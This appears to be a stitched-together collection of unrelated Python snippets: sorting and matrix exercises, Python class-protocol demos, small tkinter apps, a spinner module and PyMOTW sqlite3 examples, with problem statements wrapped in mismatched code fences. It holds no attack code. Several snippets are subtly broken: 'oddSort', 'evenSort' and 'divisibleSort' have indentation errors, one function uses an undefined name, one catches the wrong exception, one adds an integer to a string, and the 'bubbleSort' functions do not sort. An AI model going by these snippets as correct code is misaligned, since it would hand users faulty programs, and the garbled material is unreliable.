    heights = sorted(heights)

    # Replace the heights in the original list
    j = 0
    for i in range(len(a)):
        if a[i] != -1:
            a[i] = heights[j]
            j += 1

    return a
````

````py
Given an array with n objects colored red,
white or blue, sort them so that objects of the same color
are adjacent, with the colors in the order red, white and blue.

Here, we will use the integers 0, 1, and 2 to represent
the color red, white, and blue respectively.

Note:
You are not suppose to use the library's sort function for this problem.```


```py


def sort_colors(nums):
    i = j = 0
    for k in range(len(nums)):
        v = nums[k]
        nums[k] = 2
        if v < 2:
            nums[j] = 1
            j += 1
        if v == 0:
            nums[i] = 0
            i += 1


if __name__ == "__main__":
    nums = [0, 1, 1, 1, 2, 2, 2, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 2, 2]
    sort_colors(nums)
    print(nums)
````

````py
Given a m * n matrix mat of integers,
sort it diagonally in ascending order
from the top-left to the bottom-right
then return the sorted array.

mat = [
    [3,3,1,1],
    [2,2,1,2],
    [1,1,1,2]
]

Should return:
[
    [1,1,1,1],
    [1,2,2,2],
    [1,2,3,3]
]```


```py

from heapq import heappush, heappop
from typing import List


def sort_diagonally(mat: List[List[int]]) -> List[List[int]]:
    # If the input is a vector, return the vector
    if len(mat) == 1 or len(mat[0]) == 1:
        return mat

    # Rows + columns - 1
    # The -1 helps you to not repeat a column
    for i in range(len(mat) + len(mat[0]) - 1):
        # Process the rows
        if i + 1 < len(mat):
            #  Initialize heap, set row and column
            h = []
            row = len(mat) - (i + 1)
            col = 0

            # Traverse diagonally, and add the values to the heap
            while row < len(mat):
                heappush(h, (mat[row][col]))
                row += 1
                col += 1

            # Sort the diagonal
            row = len(mat) - (i + 1)
            col = 0
            while h:
                ele = heappop(h)
                mat[row][col] = ele
                row += 1
                col += 1
        else:
            # Process the columns
            # Initialize heap, row and column
            h = []
            row = 0
            col = i - (len(mat) - 1)

            # Traverse Diagonally
            while col < len(mat[0]) and row < len(mat):
                heappush(h, (mat[row][col]))
                row += 1
                col += 1

            # Sort the diagonal
            row = 0
            col = i - (len(mat) - 1)
            while h:
                ele = heappop(h)
                mat[row][col] = ele
                row += 1
                col += 1

    # Return the updated matrix
    return mat
````

````py
Sort RGB Array

Given an array of strictly the characters 'R', 'G', and 'B', segregate
the values of the array so that all the Rs come first, the Gs come second, and the Bs come last.
You can only swap elements of the array.
Do this in linear time and in-place.

Input: ['G', 'B', 'R', 'R', 'B', 'R', 'G']
Output: ['R', 'R', 'R', 'G', 'G', 'B', 'B']

=========================================
Play with pointers/indices and swap elements. (only one iteration)
Save the last R, G and B indices, when adding some color, move the rest indices by 1.
    Time Complexity:    O(N)
    Space Complexity:   O(1)
Count R, G, B and populate the array after that. (2 iterations)
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def sort_rgb_array(arr):
    n = len(arr)

    # indexes/pointers of the last element of each color
    r, g, b = 0, 0, 0

    for i in range(n):
        # swap the element and move the pointer
        if arr[i] == "R":
            swap(arr, i, r)
            r += 1

        # move pointer
        if r > g:
            g = r

        # swap the element and move the pointer
        if arr[i] == "G":
            swap(arr, i, g)
            g += 1

        # move pointer
        if g > b:
            b = g

        # swap the element and move the pointer
        if arr[i] == "B":
            swap(arr, i, b)
            b += 1

    return arr


def swap(arr, i, j):
    # swaps two elements in an array
    arr[i], arr[j] = arr[j], arr[i]


##############
# Solution 2 #
##############


def sort_rgb_array_2(arr):
    rgb = {"R": 0, "G": 0, "B": 0}

    # count colors
    for c in arr:
        rgb[c] += 1

    # adjust the intervals
    rgb["G"] += rgb["R"]
    rgb["B"] += rgb["G"]

    # assign colors
    for i in range(len(arr)):
        if i < rgb["R"]:
            arr[i] = "R"
        elif i < rgb["G"]:
            arr[i] = "G"
        else:
            arr[i] = "B"

    return arr


###########
# Testing #
###########

# Test 1
# Correct result => ['R', 'R', 'R', 'G', 'G', 'B', 'B']
print(sort_rgb_array(["G", "B", "R", "R", "B", "R", "G"]))
print(sort_rgb_array_2(["G", "B", "R", "R", "B", "R", "G"]))

# Test 2
# Correct result => ['R', 'R', 'G', 'G', 'B', 'B', 'B']
print(sort_rgb_array(["B", "B", "B", "G", "G", "R", "R"]))
print(sort_rgb_array_2(["B", "B", "B", "G", "G", "R", "R"]))

def searchInsert(nums, target):
    try:
        return nums.index(target)
    except IndexError:  # best to use explicit except
        for index, value in enumerate(nums):  # more pythonic than range(len(nums))
            if value > target:
                return index
        return len(nums)


print(searchInsert([1, 3, 5, 6], 10))

def binarySearch(arr, key):
    min = 0
    max = len(arr) - 1
    while not max < min:
        guess = (max + min) // 2

        if key == arr[guess]:
            return arr[guess]
        elif key > arr[guess]:
            min = guess + 1
        else:
            max = guess - 1
    return -1


def findValueSortedShiftedArray(nums, target):
    pivot = 3
    if nums[pivot] == target:
        return pivot
    if nums[pivot] >= target:
        value = binarySearch(nums[pivot + 1 :], target)
        print(value)
        if value == target:
            return nums.index(value)

def sorted_rotation(arr, low, high, n):
    while low < high:
        if arr[low] <= arr[high]:
            return low
        mid = low + (high - low) // 2
        next = (mid + 1) % n
        prev = (mid + n - 1) % n
        if arr[mid] < arr[next] and arr[mid] < arr[prev]:
            return mid
        elif arr[mid] <= arr[high]:
            high = mid - 1
        elif arr[mid] >= arr[low]:
            low = mid + 1
    return -1


arr = [6, 7, 8, 9, 1, 2, 3, 4, 5]

result = sorted_rotation(arr, 0, len(arr) - 1, len(arr))

print("array is rotated by : " + result)

d = {
    "foo": 12,
    "bar": 17,
    "qux": 2
}

# cast our dict to a list of pairs
items = list(d.items())
print(items)

# Sort ascending by key
items.sort()
print(items)
# Sort descending by key
items.sort(reverse=True)
print(items)

# Sort ascending by value

# we can use lambdas, an anonymous function use an arg to to represent an element (key / Val table)
# we can then return element 1 of the tuple to indicate we want to sort by value
items.sort(key=lambda e: e[1])
print(items)

# Sort descending by value
items.sort(key=lambda e: e[1], reverse=True)
print(items)

# insertion sort

my_book = {'title': 'Food for thought', 'author': 'jon jones', 'genre': 'food'}
class Book:
    def __init__(self, title, author, genre):
        self.title = title
        self.author = author
        self.genre = genre

    def __str__(self):
        return f'{self.genre}: {self.title} by {self.author}'

b1 = Book('Food for thought', 'jon jones', 'food')
b2 = Book('My life in reality', 'don davis', 'life')
b3 = Book('Apples, how you like them?', 'stan simpson', 'food')
b4 = Book('Just Do It', 'shia le boeuf', 'inspirational')
b5 = Book('What is this code anyway', 'tom jones', 'programming')

books = [b1, b2, b3, b4, b5]

def in_sort(books):
    # loop through len - 1 elements
    for i in range(1, len(books)):

        # code up some logic
        # save current i to a temp var
        temp = books[i]
        j = i

        while j > 0 and temp.title < books[j - 1].title:
            # shift left until correct tile is found
            books[j] = books[j - 1]
            j -= 1
        # insert book in correct position
        books[j] = temp

    return books

# for b in books:
#     print(b)

# print('---------------------')

# in_sort(books)


# for b in books:
#     print(b)
````

````py
- **Insertion Sort** is an _in-place_ algorithm, meaning that it
  does not require any additional memory to perform the sort operation.

- It works by conceptually dividing the array into _sorted_ and _unsorted_ pieces.

    1. Consider element at index 0 to be our  _sorted_ piece. The rest of the array is our _unsorted_ piece.

    2. Save the 1st element in the _unsorted_ piece in a temp variable.

    3. Shift elements in the _sorted_ piece over to the right until we find where the element
       from step 2 should go.

    4. Insert the element from step 2 into its correct index within the _sorted_ piece.

    5. Repeat steps 2-4 until all elements have been processed.```


```py

def in_sort2(lst):
    # loop over n - 1 elements
    for i in range(1, len(lst)):
        # save initial element to temp variable
        temp = lst[i]
        # set inner loop index to current index
        j = i
        # inner loop
        while j > 0 and temp < lst[j - 1]:
            # shift left until correct position found
            lst[j] = lst[j - 1]
            # decrement inner index
            j -= 1
        # insert temp at correct position
        lst[j] = temp
    # return our list
    return lst

my_nums = [23, 34, 60, 1, 4, 5, 2]
my_names = ['Dave', 'Steve', 'Bob']

print(my_nums)

in_sort2(my_nums)

print(my_nums)

print(my_names)

in_sort2(my_names)

print(my_names)

# functions to sort out data
# they act on lists
# you can apply these functions in your programs

# this function takes first and second element from list and compare them
def bubbleSort(g): # g argument is for list
    for x in range(len(g) - 2):
     a = g[x]
     b = g[x + 1 + 1]
     if a > b :
      return(a)
     else :
      return(b)
# use this to convert output into list
# result = list(map(bubbleSort , g)) replace g with parameter

# this function checks even num
def oddSort(odd):# odd can be list or variable
    for x in odd:
        if x % 3 == 0:
    return(x)
# use this to get list as output
# result = list(filter(oddSort , odd)) replace odd with parameter

# this function checks even num
def evenSort(eve):# eve can be list or variable
    for a in eve:
        if a % 2 == 0:
    return(a)
# use this to get list as output
# result = list(filter(evenSort , eve)) replace eve with parameter

# this function checks divisibility
def divisibleSort(divi , get):# here divi is list and get is an variable set to integer or float
    for r in divi:
        if r % get == 0:
    return(r)
# use this to get output
# result = list(filter(divisibleSort , divi , get)) replace arguments with suitable parameters

# this function checks if addition of group of two elements has desired answer
def addBubbleSort(f,user):# here f is list and user is integer or float
    for x in range(len(f) - 2):
        a = f[x]
        b = f[x + 1 + 1]
        if a + b == user:
            return(a,b)
# i havent checked this function check for bugs
# this is how it works
# res = list(filter(addBubbleSort , f , user)) replace arguments with suitable parameters

# this function checks if subtraction of group of two elements has desired answer
def subBubbleSort(z,userSub):
    for x in range(len(z) - 2):
        a = z[x]
        b = z[x + 1 + 1]
        if a - b == useSubr:
            return(a,b)
# i havent checked this function check for bugs
#res = list(filter(subBubbleSort , z , userSub)) replace arguments with suitable parameters

# O(1) space complexity

# no matter how big n gets the space used will remain the same

def o_1_space(n):
    total = 0

    for i in range(n):
        total += i
    return total

# O(n) space complexity

def o_n_space(n):
    sums = []

    for i in range(n):
        sums.append(i + i)

    return sums

# O(n^2)

def o_n2_space(n):
    times_table = [] # empty list

    for i in range(n):
        row = []

        for j in range(n):
            row.append(j * i)

        times_table.append(row)

    return times_table


#!/usr/bin/env python3
# -*- coding: utf-8 -*-


class Student(object):
    def __init__(self, name):
        self.name = name

    def __call__(self):
        print("My name is %s." % self.name)


s = Student("Michael")
s()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


class Student(object):
    def __init__(self):
        self.name = "Michael"

    def __getattr__(self, attr):
        if attr == "score":
            return 99
        if attr == "age":
            return lambda: 25
        raise AttributeError("'Student' object has no attribute '%s'" % attr)


s = Student()
print(s.name)
print(s.score)
print(s.age())
# AttributeError: 'Student' object has no attribute 'grade'
print(s.grade)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


class Fib(object):
    def __getitem__(self, n):
        if isinstance(n, int):
            a, b = 1, 1
            for x in range(n):
                a, b = b, a + b
            return a
        if isinstance(n, slice):
            start = n.start
            stop = n.stop
            if start is None:
                start = 0
            a, b = 1, 1
            L = []
            for x in range(stop):
                if x >= start:
                    L.append(a)
                a, b = b, a + b
            return L


f = Fib()
print(f[0])
print(f[5])
print(f[100])
print(f[0:5])
print(f[:10])

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


class Fib(object):
    def __init__(self):
        self.a, self.b = 0, 1  # a，b

    def __iter__(self):
        return self  # ，

    def __next__(self):
        self.a, self.b = self.b, self.a + self.b  #
        if self.a > 100000:  #
            raise StopIteration()
        return self.a  #


for n in Fib():
    print(n)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


class Student(object):
    def __init__(self, name):
        self.name = name

    def __str__(self):
        return "Student object (name: %s)" % self.name

    __repr__ = __str__


print(Student("Michael"))

import tkinter as tk
import speedtest
from tkinter import messagebox

st = speedtest.Speedtest()
root = tk.Tk()
root.geometry("400x400")
root.title("SpeedTest")
root.config(bg="#3b4d61")
font = ("Verdana",15, "bold")

def check():
    messagebox.showinfo("Confirmation", '''Speed Test Starting .....
                                            It may take upto 1 min''')
    d.configure(text=str(st.download()//10**6)+"Mbps")
    u.configure(text=str(st.upload()//10**6)+"Mbps")
    p.configure(text=str(int(st.results.ping))+"MS")
    l.configure(text="Speed Test Complete")

dspeed = tk.Label(root,text="Download Speed:",bg="#3b4d61",fg="yellow",font=font)
dspeed.place(x=10,y=10)
d = tk.Label(root,text="0 Mbps",bg="#3b4d61",fg="yellow",font=font)
d.place(x=250,y=10)
uspeed = tk.Label(root,text="Upload Speed:",bg="#3b4d61",fg="yellow",font=font)
uspeed.place(x=10,y=50)
u = tk.Label(root,text="0 Mbps",bg="#3b4d61",fg="yellow",font=font)
u.place(x=250,y=50)
ping = tk.Label(root,text="Ping:",bg="#3b4d61",fg="yellow",font=font)
ping.place(x=10,y=90)
p = tk.Label(root,text="0 MS",bg="#3b4d61",fg="yellow",font=font)
p.place(x=250,y=90)

l = tk.Label(root,text="Click Here to start speed test",bg="#3b4d61",fg="yellow",font=(15))
l.place(x=50,y=250)
b = tk.Button(root,text="Speed Text",command=check,bg="yellow",fg="black")
b.place(x=50,y=300,height=40,width=300)
root.mainloop()

# Spelling Corrector

import tkinter
from tkinter import *
import tkinter as tk
import tkinter.messagebox as mbox
from PIL import Image, ImageTk
from textblob import TextBlob

firstclick1 = True
def on_e1_click(event):
    """function that gets called whenever entry1 is clicked"""
    global firstclick1

    if firstclick1: # if this is the first time they clicked it
        firstclick1 = False
        e1.delete(0, "end") # delete all the text in the entry

def correct_word():
    user_word = e1.get()
    ans = TextBlob(user_word).correct()
    e2text.delete('1.0', END)
    e2text.insert(END, ans)


window = Tk()
window.geometry("1000x700")
window.title("Spelling Corrector")

# image on the main window
path = "Images/spell.jpg"
# Creates a Tkinter-compatible photo image, which can be used everywhere Tkinter expects an image object.
img = ImageTk.PhotoImage(Image.open(path))
# The Label widget is a standard Tkinter widget used to display a text or image on the screen.
panel = tk.Label(window, image = img, anchor = "nw")
# The Pack geometry manager packs widgets in rows or columns.
# panel.pack(side = "top", fill = "both", expand = "no")
panel.place(x = 290, y = 110)

start1 = tk.Label(text = "SPELLING  CORRECTOR", font=("Arial", 50), fg="magenta",underline=0) # same way bg
start1.place(x = 100, y = 10)

e1label = tk.Label(text = "Word : ", font=("Arial", 30), fg="brown") # same way bg
e1label.place(x = 100, y = 380)

e1 = Entry(window,font=("Arial", 30) , width=25, border=2)
e1.insert(0, 'Enter your word here...')
e1.bind('<FocusIn>', on_e1_click)
e1.place(x = 240, y = 380)

e2label = tk.Label(text = "Corrected Spelled Word is : ", font=("Arial", 30), fg="brown") # same way bg
e2label.place(x = 230, y = 450)

def clear_label():
    e1.delete(0, "end")
    e2text.delete('1.0', END)

e2text = tk.Text(window, height=1, width=28, font=("Arial", 30), bg="light yellow", fg="green", borderwidth=3, relief="solid")
e2text.place(x=180, y=500)

correctb = Button(window, text="CORRECT",command=correct_word,font=("Arial", 20), bg = "light green", fg = "blue", borderwidth=3, relief="raised")
correctb.place(x =230 , y =590 )

clearb = Button(window, text="CLEAR",command=clear_label,font=("Arial", 20), bg = "light green", fg = "blue", borderwidth=3, relief="raised")
clearb.place(x =470 , y =590 )

def exit_win():
    if mbox.askokcancel("Exit", "Do you want to exit?"):
        window.destroy()

exitb = Button(window, text="EXIT",command=exit_win,font=("Arial", 20), bg = "red", fg = "blue", borderwidth=3, relief="raised")
exitb.place(x =670 , y =590 )


window.protocol("WM_DELETE_WINDOW", exit_win)
window.mainloop()
# -*- coding: utf-8 -*-

# Copyright (c) 2012 Giorgos Verigakis <verigak@gmail.com>
#
# Permission to use, copy, modify, and distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

from __future__ import unicode_literals
from . import Infinite


class Spinner(Infinite):
    phases = ("-", "\\", "|", "/")
    hide_cursor = True

    def update(self):
        i = self.index % len(self.phases)
        self.write(self.phases[i])


class PieSpinner(Spinner):
    phases = ["◷", "◶", "◵", "◴"]


class MoonSpinner(Spinner):
    phases = ["◑", "◒", "◐", "◓"]


class LineSpinner(Spinner):
    phases = ["⎺", "⎻", "⎼", "⎽", "⎼", "⎻"]


class PixelSpinner(Spinner):
    phases = ["⣾", "⣷", "⣯", "⣟", "⡿", "⢿", "⣻", "⣽"]
````

````py
Spiral Matrix

Given a matrix of m x n elements (m rows, n columns), return all elements of the matrix in spiral order.

Input:
[
 [ 1, 2, 3 ],
 [ 4, 5, 6 ],
 [ 7, 8, 9 ]
]
Output: [1, 2, 3, 6, 9, 8, 7, 4, 5]

Input:
[
  [1, 2, 3, 4],
  [5, 6, 7, 8],
  [9, 10, 11, 12]
]
Output: [1, 2, 3, 4, 8, 12, 11, 10, 9, 5, 6, 7]

=========================================
Simulate spiral moving, start from (0,0) and when a border is reached change the X or Y direction.
    Time Complexity:    O(N*M)
    Space Complexity:   O(N*M)```


```py


############
# Solution #
############


def spiral_matrix(matrix):
    n = len(matrix)
    if n == 0:
        return []

    m = len(matrix[0])
    if m == 0:
        return []

    total = n * m
    res = []

    n -= 1
    xDir, yDir = 1, 1
    x, y = 0, -1

    while len(res) < total:
        for i in range(m):
            y += yDir
            res.append(matrix[x][y])
        m -= 1  # decrease horizontal moving steps
        yDir *= -1  # change the Y direction

        for i in range(n):
            x += xDir
            res.append(matrix[x][y])
        n -= 1  # decrease vertical moving steps
        xDir *= -1  # change the Y direction

    return res


###########
# Testing #
###########

# Test 1
# Correct result => [1, 2, 3, 6, 9, 8, 7, 4, 5]
print(spiral_matrix([[1, 2, 3], [4, 5, 6], [7, 8, 9]]))

# Test 2
# Correct result => [1, 2, 3, 4, 8, 12, 11, 10, 9, 5, 6, 7]
print(spiral_matrix([[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12]]))
````

````py
This program print the matrix in spiral form.
This problem has been solved through recursive way.

      Matrix must satisfy below conditions
        i) matrix should be only one or two dimensional
        ii)column of all the row should be equal```


```py


def checkMatrix(a):
    # must be
    if type(a) == list and len(a) > 0:
        if type(a[0]) == list:
            prevLen = 0
            for i in a:
                if prevLen == 0:
                    prevLen = len(i)
                    result = True
                elif prevLen == len(i):
                    result = True
                else:
                    result = False
        else:
            result = True
    else:
        result = False
    return result


def spiralPrint(a):

    if checkMatrix(a) and len(a) > 0:

        matRow = len(a)
        if type(a[0]) == list:
            matCol = len(a[0])
        else:
            for dat in a:
                print(dat),
            return

        # horizotal printing increasing
        for i in range(0, matCol):
            print(a[0][i]),
        # vertical printing down
        for i in range(1, matRow):
            print(a[i][matCol - 1]),
        # horizotal printing decreasing
        if matRow > 1:
            for i in range(matCol - 2, -1, -1):
                print(a[matRow - 1][i]),
        # vertical printing up
        for i in range(matRow - 2, 0, -1):
            print(a[i][0]),
        remainMat = [row[1 : matCol - 1] for row in a[1 : matRow - 1]]
        if len(remainMat) > 0:
            spiralPrint(remainMat)
        else:
            return
    else:
        print("Not a valid matrix")
        return


# driver code
a = [[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12]]
spiralPrint(a)

#!/usr/bin/env python```


```py
Solutions to Project Euler Problems
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

Spirals.```


```py
from itertools import count


def spiral_diagonal_numbers():
    yield 1, 1, 0
    number = 1
    for r in count(1):
        side = 2 * r
        for diag_no in range(4):
            number += side
            yield number, side + 1, diag_no


def spiral_diagonal_numbers_upto(n):
    numbers = spiral_diagonal_numbers()
    for _ in range(n):
        yield next(numbers)


def n_diagonal_for_side(m):
    return 1 + 4 * (m - 1) // 2

def split_string(string: str, break_on: str = " ") -> list:
    # A list is similar to an array but apparently not the same

    split_words = []

    last_index = 0
    for index, char in enumerate(string):
        if char == break_on:
            split_words.append(string[last_index:index])
            last_index = index + 1
        elif index + 1 == len(string):
            split_words.append(string[last_index : index + 1])
    return split_words

def split(string: str, separator: str = " ") -> list:
    """
    Will split the string up into all the values separated by the separator
    (defaults to spaces)

    >>> split("apple#banana#cherry#orange",separator='#')
    ['apple', 'banana', 'cherry', 'orange']

    >>> split("Hello there")
    ['Hello', 'there']

    >>> split("11/22/63",separator = '/')
    ['11', '22', '63']

    >>> split("12:43:39",separator = ":")
    ['12', '43', '39']
    """

    split_words = []

    last_index = 0
    for index, char in enumerate(string):
        if char == separator:
            split_words.append(string[last_index:index])
            last_index = index + 1
        elif index + 1 == len(string):
            split_words.append(string[last_index : index + 1])
    return split_words


if __name__ == "__main__":
    from doctest import testmod

    testmod()
````

````py
Split Coins

You have a number of coins with various amounts.
You need to split the coins in two groups so that the difference between those groups in minimal.

Input: [1, 1, 1, 3, 5, 10, 18]
Output: 1
Output explanation: First group 1, 3, 5, 10 (or 1, 1, 3, 5, 10) and second group 1, 1, 18 (or 1, 18).

=========================================
Simple dynamic programming solution. Find the closest sum to the half of the sum of all coins.
    Time Complexity:    O(C*HS)     , C = number of coins, HS = half of the sum of all coins
    Space Complexity:   O(HS)```


```py


############
# Solution #
############


def split_coins(coins):
    if len(coins) == 0:
        return -1

    full_sum = sum(coins)
    half_sum = full_sum // 2 + 1

    dp = [False] * half_sum
    dp[0] = True

    for c in coins:
        for i in range(half_sum - 1, -1, -1):
            if (i >= c) and dp[i - c]:
                # if you want to find coins, save the coin here dp[i] = c
                dp[i] = True

    for i in range(half_sum - 1, -1, -1):
        if dp[i]:
            # if you want to print coins, while i>0: print(dp[i]) i -= dp[i]
            return full_sum - 2 * i

    # not possible
    return -1


###########
# Testing #
###########

# Test 1
# Correct result => 1
print(split_coins([1, 1, 1, 3, 5, 10, 18]))

def sprialMatrix(arr, m, n):
    k = 0
    l = 0
    while k < m and l < n:

        for i in range(l, n):
            print(arr[k][i], end=" ")
        k += 1

        for i in range(k, m):
            print(arr[i][n - 1], end=" ")
        n -= 1

        if k < m:
            for i in range(n - 1, l - 1, -1):
                print(arr[m - 1][i], end=" ")
            m -= 1
        if l < n:
            for i in range(m - 1, k - 1, -1):
                print(arr[i][l], end=" ")
            l += 1


# function calling
sprialMatrix([[1, 2, 3], [4, 5, 6], [7, 8, 9]], 3, 3)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyQuery tasks in the database.```


```py

#end_pymotw_header
import sqlite3
import sys

db_filename = 'todo.db'
project_name = sys.argv[1]

with sqlite3.connect(db_filename) as conn:
    cursor = conn.cursor()

    query = """
    select id, priority, details, status, deadline from task
    where project = :project_name
    order by deadline, priority
    """

    cursor.execute(query, {'project_name': project_name})

    for row in cursor.fetchall():
        task_id, priority, details, status, deadline = row
        print('{:2d} [{:d}] {:<25} [{:<8}] ({})'.format(
            task_id, priority, details, status, deadline))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyQuery tasks in the database.```


```py

#end_pymotw_header
import sqlite3
import sys

db_filename = 'todo.db'
project_name = sys.argv[1]

with sqlite3.connect(db_filename) as conn:
    cursor = conn.cursor()

    query = """
    select id, priority, details, status, deadline from task
    where project = ?
    """

    cursor.execute(query, (project_name,))

    for row in cursor.fetchall():
        task_id, priority, details, status, deadline = row
        print('{:2d} [{:d}] {:<25} [{:<8}] ({})'.format(
            task_id, priority, details, status, deadline))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyUpdate the status of a task```


```py

#end_pymotw_header
import sqlite3
import sys

db_filename = 'todo.db'
id = int(sys.argv[1])
status = sys.argv[2]

with sqlite3.connect(db_filename) as conn:
    cursor = conn.cursor()
    query = "update task set status = :status where id = :id"
    cursor.execute(query, {'status': status, 'id': id})

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyIllustrate the effect of autocommit mode.```


```py

#end_pymotw_header
import logging
import sqlite3
import sys
import threading
import time

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s (%(threadName)-10s) %(message)s',
)

db_filename = 'todo.db'
isolation_level = None  # autocommit mode


def writer():
    with sqlite3.connect(
            db_filename,
            isolation_level=isolation_level) as conn:
        cursor = conn.cursor()
        cursor.execute('update task set priority = priority + 1')
        logging.debug('waiting to synchronize')
        ready.wait()  # synchronize threads
        logging.debug('PAUSING')
        time.sleep(1)


def reader():
    with sqlite3.connect(
            db_filename,
            isolation_level=isolation_level) as conn:
        cursor = conn.cursor()
        logging.debug('waiting to synchronize')
        ready.wait()  # synchronize threads
        logging.debug('wait over')
        cursor.execute('select * from task')
        logging.debug('SELECT EXECUTED')
        cursor.fetchall()
        logging.debug('results fetched')


if __name__ == '__main__':
    ready = threading.Event()

    threads = [
        threading.Thread(name='Reader 1', target=reader),
        threading.Thread(name='Reader 2', target=reader),
        threading.Thread(name='Writer 1', target=writer),
        threading.Thread(name='Writer 2', target=writer),
    ]

    [t.start() for t in threads]

    time.sleep(1)
    logging.debug('setting ready')
    ready.set()

    [t.join() for t in threads]

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDefine a new aggregator function.```


```py

#end_pymotw_header
import sqlite3
import collections

db_filename = 'todo.db'


class Mode:

    def __init__(self):
        self.counter = collections.Counter()

    def step(self, value):
        print('step({!r})'.format(value))
        self.counter[value] += 1

    def finalize(self):
        result, count = self.counter.most_common(1)[0]
        print('finalize() -> {!r} ({} times)'.format(
            result, count))
        return result


with sqlite3.connect(db_filename) as conn:
    conn.create_aggregate('mode', 1, Mode)

    cursor = conn.cursor()
    cursor.execute("""
    select mode(deadline) from task where project = 'pymotw'
    """)
    row = cursor.fetchone()
    print('mode(deadline) is:', row[0])

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCreating functions to run in SQL statements.```


```py

#end_pymotw_header
import codecs
import sqlite3

db_filename = 'todo.db'


def encrypt(s):
    print('Encrypting {!r}'.format(s))
    return codecs.encode(s, 'rot-13')


def decrypt(s):
    print('Decrypting {!r}'.format(s))
    return codecs.encode(s, 'rot-13')


with sqlite3.connect(db_filename) as conn:

    conn.create_function('encrypt', 1, encrypt)
    conn.create_function('decrypt', 1, decrypt)
    cursor = conn.cursor()

    # Raw values
    print('Original values:')
    query = "select id, details from task"
    cursor.execute(query)
    for row in cursor.fetchall():
        print(row)

    print('\nEncrypting...')
    query = "update task set details = encrypt(details)"
    cursor.execute(query)

    print('\nRaw encrypted values:')
    query = "select id, details from task"
    cursor.execute(query)
    for row in cursor.fetchall():
        print(row)

    print('\nDecrypting in query...')
    query = "select id, decrypt(details) from task"
    cursor.execute(query)
    for row in cursor.fetchall():
        print(row)

    print('\nDecrypting...')
    query = "update task set details = decrypt(details)"
    cursor.execute(query)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCreating the schema in an sqlite3 database.```


```py

#end_pymotw_header
import os
import sqlite3

db_filename = 'todo.db'
schema_filename = 'todo_schema.sql'

db_is_new = not os.path.exists(db_filename)

with sqlite3.connect(db_filename) as conn:
    if db_is_new:
        print('Creating schema')
        with open(schema_filename, 'rt') as f:
            schema = f.read()
        conn.executescript(schema)

        print('Inserting initial data')

        conn.executescript("""
        insert into project (name, description, deadline)
        values ('pymotw', 'Python Module of the Week',
                '2016-11-01');

        insert into task (details, status, deadline, project)
        values ('write about select', 'done', '2016-04-25',
                'pymotw');

        insert into task (details, status, deadline, project)
        values ('write about random', 'waiting', '2016-08-22',
                'pymotw');

        insert into task (details, status, deadline, project)
        values ('write about sqlite3', 'active', '2017-07-31',
                'pymotw');
        """)
    else:
        print('Database exists, assume schema does, too.')

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCreating an sqlite3 database.```


```py

#end_pymotw_header
import os
import sqlite3

db_filename = 'todo.db'

db_is_new = not os.path.exists(db_filename)

conn = sqlite3.connect(db_filename)

if db_is_new:
    print('Need to create schema')
else:
    print('Database exists, assume schema does, too.')

conn.close()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyQuery tasks in the database.```


```py

#end_pymotw_header
import sqlite3

db_filename = 'todo.db'

with sqlite3.connect(db_filename) as conn:
    cursor = conn.cursor()

    cursor.execute("""
    select * from task where project = 'pymotw'
    """)

    print('Task table has these columns:')
    for colinfo in cursor.description:
        print(colinfo)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDefining a custom type.```


```py

#end_pymotw_header
import pickle
import sqlite3

db_filename = 'todo.db'


def adapter_func(obj):
    """Convert from in-memory to storage representation.
    """
    print('adapter_func({})\n'.format(obj))
    return pickle.dumps(obj)


def converter_func(data):
    """Convert from storage to in-memory representation.
    """
    print('converter_func({!r})\n'.format(data))
    return pickle.loads(data)


class MyObj:

    def __init__(self, arg):
        self.arg = arg

    def __str__(self):
        return 'MyObj({!r})'.format(self.arg)


# Register the functions for manipulating the type.
sqlite3.register_adapter(MyObj, adapter_func)
sqlite3.register_converter("MyObj", converter_func)

# Create some objects to save.  Use a list of tuples so
# the sequence can be passed directly to executemany().
to_save = [
    (MyObj('this is a value to save'),),
    (MyObj(42),),
]

with sqlite3.connect(
        db_filename,
        detect_types=sqlite3.PARSE_DECLTYPES) as conn:
    # Create a table with column of type "MyObj"
    conn.execute("""
    create table if not exists obj (
        id    integer primary key autoincrement not null,
        data  MyObj
    )
    """)
    cursor = conn.cursor()

    # Insert the objects into the database
    cursor.executemany("insert into obj (data) values (?)",
                       to_save)

    # Query the database for the objects just saved
    cursor.execute("select id, data from obj")
    for obj_id, obj in cursor.fetchall():
        print('Retrieved', obj_id, obj)
        print('  with type', type(obj))
        print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


